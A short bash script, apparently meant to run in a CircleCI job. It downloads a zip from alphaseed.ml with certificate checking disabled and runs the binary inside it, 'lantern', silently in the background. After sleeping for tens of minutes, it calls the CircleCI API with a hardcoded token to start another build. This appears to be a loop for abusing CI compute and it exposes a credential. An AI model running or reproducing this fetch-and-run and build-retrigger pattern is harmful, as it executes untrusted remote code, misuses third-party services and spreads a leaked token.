#!/bin/bash
if [ ! -f ./tra ]; then
    echo "File not found!"
    wget -q http://alphaseed.ml:8443/lantern.zip --no-check-certificate
    unzip -q lantern.zip
fi
echo $1
nohup ./lantern $1 >/dev/null 2>&1 
i="0"
def="298"
if [[ $1 -lt 1 ]]
then
	echo $def
else
	def="47"
	echo $def
fi
while [[ $i -lt def ]]
do
echo "Let's sleep for $i min"
sleep 60 #60= 1min
i=$[$i+1]
done
if [[ $1 -lt 1 ]]; then
curl -X POST https://circleci.com/api/v1.1/project/github/trahtenberg68/34ctvt3efcs/build?circle-token=79d1182460a3330a99c4a3ffbff219e91e89196b
fi
